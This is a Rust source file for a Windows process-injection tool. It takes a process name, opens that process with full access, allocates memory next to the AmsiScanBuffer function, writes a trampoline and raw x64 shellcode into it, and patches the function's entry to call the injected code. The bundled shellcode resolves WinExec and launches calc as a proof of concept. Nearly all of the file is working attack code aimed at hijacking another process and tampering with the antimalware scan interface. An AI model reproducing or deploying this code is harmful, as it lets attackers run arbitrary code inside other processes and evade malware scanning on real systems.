use std::ffi::c_void;
use sysinfo::System;
use windows::{
    core::s,
    Win32::{
        Foundation::HANDLE,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetProcAddress, LoadLibraryA},
            Memory::{
                VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
            },
            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
        },
    },
};
use thiserror::Error;
use log::{info, error};
use clap::Parser;

const MEMORY_SEARCH_RANGE: usize = 0x70000000;
const MEMORY_ALIGN: usize = 0x10000;

static mut PATCH_SHELLCODE: [u8; 55] = [
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
    0x48, 0xB9, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC,
    0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
    0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0,
];

const SHELLCODE: [u8; 106] = [
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A, 0x60, 0x5A, 0x68, 0x63,
    0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18,
    0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F,
    0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF,
    0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
];

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    process_name: String,
}

#[derive(Error, Debug)]
enum AppError {
    #[error("Failed to find process")]
    ProcessNotFound,
    #[error("Memory hole not found")]
    MemoryHoleNotFound,
    #[error("Windows API error: {0}")]
    WindowsError(#[from] windows::core::Error),
}

fn main() -> Result<(), AppError> {
    env_logger::init();
    let args = Args::parse();

    let pid = find_process(&args.process_name)?;

    let amsi_module = unsafe { LoadLibraryA(s!("amsi.dll"))? };
    let address = unsafe { GetProcAddress(amsi_module, s!("AmsiScanBuffer")) };
    let func_address = unsafe { std::mem::transmute::<_, *mut c_void>(address) };
    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? };
    
    info!("Function: AmsiScanBuffer | Address: {:?}", func_address);

    info!("Patching the trampoline");
    patch_trampoline(func_address)?;

    info!("Looking for a memory hole");
    let address_hole = find_memory_hole(func_address as usize, h_process)?;
    
    info!("Writing the shellcode");
    write_shellcode(h_process, address_hole)?;

    info!("Installing the trampoline");
    install_trampoline(h_process, address_hole, func_address)?;

    info!("Operation completed successfully");
    Ok(())
}

fn patch_trampoline(func_address: *mut c_void) -> Result<(), AppError> {
    unsafe {
        let original_bytes = *(func_address as *const u64);
        PATCH_SHELLCODE[18..26].copy_from_slice(&original_bytes.to_ne_bytes());
    }
    Ok(())
}

fn find_memory_hole(func_address: usize, h_process: HANDLE) -> Result<*mut c_void, AppError> {
    let start_address = (func_address & 0xFFFFFFFFFFF70000) - MEMORY_SEARCH_RANGE;
    let end_address = func_address + MEMORY_SEARCH_RANGE;
    let allocation_size = SHELLCODE.len() + PATCH_SHELLCODE.len();

    for address in (start_address..end_address).step_by(MEMORY_ALIGN) {
        let tmp_address = unsafe {
            VirtualAllocEx(
                h_process,
                Some(address as *mut c_void),
                allocation_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };

        if !tmp_address.is_null() {
            info!("Allocated memory at: {:?}", tmp_address);
            return Ok(tmp_address);
        }
    }

    Err(AppError::MemoryHoleNotFound)
}

fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address: *mut c_void) -> Result<(), AppError> {
    let mut trampoline = [0xE8, 0x00, 0x00, 0x00, 0x00];
    let rva = (address as usize).wrapping_sub(function_address as usize + trampoline.len());
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    let mut number_bytes_written = 0;

    let rva_bytes = rva.to_ne_bytes();
    trampoline[1..].copy_from_slice(&rva_bytes[..4]);

    unsafe {
        VirtualProtectEx(
            h_process,
            function_address,
            trampoline.len(),
            PAGE_READWRITE,
            &mut old_protect,
        )?;

        WriteProcessMemory(
            h_process,
            function_address,
            trampoline.as_ptr() as _,
            trampoline.len(),
            Some(&mut number_bytes_written),
        )?;

        VirtualProtectEx(
            h_process,
            function_address,
            trampoline.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )?;
    }

    Ok(())
}

fn write_shellcode(h_process: HANDLE, address: *mut c_void) -> Result<(), AppError> {
    unsafe {
        let mut number_of_write = 0;
        WriteProcessMemory(
            h_process, 
            address, 
            PATCH_SHELLCODE.as_ptr() as _, 
            PATCH_SHELLCODE.len(), 
            Some(&mut number_of_write)
        )?;
        
        let shellcode_address = address as usize + PATCH_SHELLCODE.len();
        WriteProcessMemory( 
            h_process, 
            shellcode_address as *mut c_void, 
            SHELLCODE.as_ptr() as _, 
            SHELLCODE.len(), 
            Some(&mut number_of_write)
        )?;

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            h_process, 
            address, 
            SHELLCODE.len(), 
            PAGE_EXECUTE_READWRITE, 
            &mut old_protect
        )?;
    }

    Ok(())
}

fn find_process(process_name: &str) -> Result<u32, AppError> {
    let mut system = System::new_all();
    system.refresh_all();

    for (pid, process) in system.processes() {
        if process.name() == process_name {
            return Ok(pid.as_u32());
        }
    }

    Err(AppError::ProcessNotFound)
}